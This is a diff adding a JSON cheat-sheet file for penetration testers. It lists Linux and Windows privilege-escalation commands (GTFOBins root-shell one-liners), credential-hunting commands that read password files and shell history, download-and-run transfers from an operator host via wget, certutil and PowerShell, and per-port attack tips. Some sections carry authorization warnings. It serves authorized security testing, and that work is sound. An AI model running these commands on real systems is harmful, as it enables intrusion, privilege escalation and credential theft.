@@ -1,0 +1,259 @@
+{
+  "version": 1,
+  "updated": "2026-10-11",
+  "note": "Operator cheat sheets for the stages a command builder does not cover: what to check after you land a shell, and how to move files. Privilege-escalation abuses are from GTFOBins. Nothing runs; the page hands you text.",
+  "groups": [
+    {
+      "id": "linpeas",
+      "name": "Linux privilege escalation",
+      "sections": [
+        {
+          "name": "Enumerate first",
+          "intro": "Run these before anything else. Most escalations are visible in the output.",
+          "items": [
+            {
+              "text": "id; sudo -l",
+              "note": "Who you are, and what you may run as root without a password. Check sudo -l first, always."
+            },
+            {
+              "text": "find / -perm -4000 -type f 2>/dev/null",
+              "note": "Every SUID binary. Cross-check each against GTFOBins."
+            },
+            {
+              "text": "find / -perm -2000 -type f 2>/dev/null",
+              "note": "SGID binaries, the same idea for group privilege."
+            },
+            {
+              "text": "getcap -r / 2>/dev/null",
+              "note": "File capabilities. cap_setuid on a binary is root."
+            },
+            {
+              "text": "cat /etc/crontab; ls -la /etc/cron.*",
+              "note": "Scheduled jobs. A writable script run by root is a clean escalation."
+            },
+            {
+              "text": "uname -a; cat /etc/os-release",
+              "note": "Kernel and distro version, for a kernel exploit as a last resort."
+            }
+          ]
+        },
+        {
+          "name": "SUID and sudo abuse (GTFOBins)",
+          "intro": "If one of these is SUID or in your sudo -l, it is a root shell.",
+          "warn": "These escalate privilege. Only on a system you are authorized to test, and record each one used.",
+          "items": [
+            {
+              "text": "sudo find . -exec /bin/sh \\; -quit",
+              "note": "find via sudo spawns a shell as the target user."
+            },
+            {
+              "text": "find . -exec /bin/sh -p \\; -quit",
+              "note": "find as a SUID binary: -p keeps the elevated euid."
+            },
+            {
+              "text": "sudo vim -c ':!/bin/sh'",
+              "note": "vim via sudo drops to a shell."
+            },
+            {
+              "text": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+              "note": "awk via sudo runs a shell from BEGIN."
+            },
+            {
+              "text": "sudo nmap --interactive",
+              "note": "Old nmap (<5.21) with --interactive has !sh."
+            },
+            {
+              "text": "sudo env /bin/sh",
+              "note": "env runs any binary; via sudo that is a root shell."
+            }
+          ]
+        },
+        {
+          "name": "Credentials and writable files",
+          "intro": "Often faster than an exploit.",
+          "items": [
+            {
+              "text": "grep -rE 'password|passwd|secret|api[_-]?key' /etc /var/www /opt 2>/dev/null",
+              "note": "Hard-coded credentials in config."
+            },
+            {
+              "text": "cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null",
+              "note": "Commands others typed, sometimes with passwords inline."
+            },
+            {
+              "text": "ls -la /etc/passwd /etc/shadow",
+              "note": "Writable passwd or readable shadow is immediate escalation."
+            },
+            {
+              "text": "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys'",
+              "note": "Writable directories, for a cron or PATH hijack."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "winpeas",
+      "name": "Windows privilege escalation",
+      "sections": [
+        {
+          "name": "Enumerate first",
+          "intro": "The Windows equivalents. whoami /priv is the fastest win.",
+          "items": [
+            {
+              "text": "whoami /priv",
+              "note": "Your privileges. SeImpersonate or SeAssignPrimaryToken means a Potato attack to SYSTEM."
+            },
+            {
+              "text": "whoami /all",
+              "note": "Full token: groups and privileges."
+            },
+            {
+              "text": "systeminfo",
+              "note": "OS version and hotfixes, for matching a kernel exploit."
+            },
+            {
+              "text": "net user; net localgroup administrators",
+              "note": "Accounts and who is already an admin."
+            }
+          ]
+        },
+        {
+          "name": "Common escalation paths",
+          "intro": "The high-frequency Windows misconfigurations.",
+          "warn": "Escalation on a system you do not own is intrusion. Scope it.",
+          "items": [
+            {
+              "text": "sc query; wmic service get name,pathname,startmode | findstr /i auto",
+              "note": "Services. An unquoted path with a space, or a writable binary, is escalation."
+            },
+            {
+              "text": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+              "note": "If both HKLM and HKCU are 1, any MSI runs as SYSTEM."
+            },
+            {
+              "text": "dir /s *pass* == *.config *.xml 2>nul | findstr /i pass",
+              "note": "Credentials in config files, unattend.xml, web.config."
+            },
+            {
+              "text": "cmdkey /list",
+              "note": "Stored credentials you can reuse with runas /savecred."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "transfer",
+      "name": "File transfer",
+      "sections": [
+        {
+          "name": "Serve a file from your box",
+          "intro": "Run one of these on your machine, then pull from the target.",
+          "items": [
+            {
+              "text": "python3 -m http.server 80",
+              "note": "The universal file server. Serves the current directory over HTTP."
+            },
+            {
+              "text": "impacket-smbserver share . -smb2support",
+              "note": "An SMB share, for Windows targets where HTTP is blocked."
+            },
+            {
+              "text": "python3 -m uploadserver 80",
+              "note": "An HTTP server that also accepts uploads, for pulling files back."
+            }
+          ]
+        },
+        {
+          "name": "Download onto the target",
+          "intro": "Pick the one whose tool is present.",
+          "items": [
+            {
+              "text": "wget http://YOU/file -O /tmp/file",
+              "note": "Linux, the common case."
+            },
+            {
+              "text": "curl http://YOU/file -o /tmp/file",
+              "note": "Linux or modern Windows (curl.exe ships since Win10 1803)."
+            },
+            {
+              "text": "certutil -urlcache -split -f http://YOU/file out.exe",
+              "note": "Windows, signed and always present. Noisy."
+            },
+            {
+              "text": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://YOU/f','C:\\f.exe')\"",
+              "note": "Windows PowerShell."
+            },
+            {
+              "text": "scp user@YOU:/file /tmp/file",
+              "note": "When you have SSH credentials."
+            }
+          ]
+        },
+        {
+          "name": "No tool? Encode and paste",
+          "intro": "When there is no network path at all.",
+          "items": [
+            {
+              "text": "base64 -w0 file   # on your box, then paste and: base64 -d > file",
+              "note": "Move a small binary through a shell by base64, no transfer tool needed."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ports",
+      "name": "Ports and services",
+      "sections": [
+        {
+          "name": "What is on the port, and what to do next",
+          "intro": "The common ports, what runs there, and which builder or step to open.",
+          "items": [
+            {
+              "text": "21 FTP",
+              "note": "Anonymous login, clear-text creds. Try ftp, check for anonymous."
+            },
+            {
+              "text": "22 SSH",
+              "note": "Version for CVEs; key-based or password. hydra for a password test in scope."
+            },
+            {
+              "text": "25/465/587 SMTP",
+              "note": "User enumeration via VRFY; open relay. Mail injection under WSTG-INJT-10."
+            },
+            {
+              "text": "53 DNS",
+              "note": "Zone transfer: dig axfr @server domain. Subdomain source."
+            },
+            {
+              "text": "80/443 HTTP(S)",
+              "note": "The web discipline. Start with the Methodology, Web tab."
+            },
+            {
+              "text": "139/445 SMB",
+              "note": "The highest-value internal port. enum4linux-ng, netexec, null sessions, shares."
+            },
+            {
+              "text": "161 SNMP",
+              "note": "snmp-check with 'public'. Leaks the full device config."
+            },
+            {
+              "text": "1433 MSSQL / 3306 MySQL / 5432 Postgres",
+              "note": "Databases. Default creds, then the sqlmap builder once you have injection into them."
+            },
+            {
+              "text": "3389 RDP",
+              "note": "Credential spray in scope; BlueKeep on old Windows."
+            },
+            {
+              "text": "5985/5986 WinRM",
+              "note": "Remote management. netexec winrm or evil-winrm with valid creds."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
